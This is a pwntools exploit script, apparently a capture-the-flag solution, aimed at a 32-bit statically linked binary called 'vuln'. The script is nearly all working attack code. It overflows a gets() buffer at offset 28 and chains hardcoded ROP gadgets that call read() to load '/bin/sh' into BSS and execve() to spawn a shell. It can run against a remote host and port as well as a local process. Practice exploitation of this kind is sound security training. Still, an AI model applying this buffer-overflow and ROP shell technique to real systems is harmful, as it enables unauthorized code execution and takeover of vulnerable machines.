#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x8048000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

log.info("""statically linked, no pie, real simple gets->rop""")

RIP_DIST = 28

BSS_BUFF     = 0x80e5A00
SYSCALL      = 0x08071640
POP_EAX      = 0x080b073a
POP_ECX      = 0x08049e29
POP_EDX_EBX  = 0x080583b9

SYS_READ     = 3
SYS_EXECVE   = 11

io = start()
#pause()

io.sendline(cyclic(RIP_DIST) +
            p32(POP_EDX_EBX) + p32(100) + p32(0) +
            p32(POP_ECX) + p32(BSS_BUFF) +
            p32(POP_EAX) + p32(SYS_READ) +
            p32(SYSCALL) + # read(0, BSS_BUFF, 100)
            p32(POP_EDX_EBX) + p32(0) + p32(BSS_BUFF) +
            p32(POP_ECX) + p32(0) +
            p32(POP_EAX) + p32(SYS_EXECVE) +
            p32(SYSCALL)   # execve(/bin/sh, NULL, NULL)
            )

io.send(b'/bin/sh\0')

io.interactive()

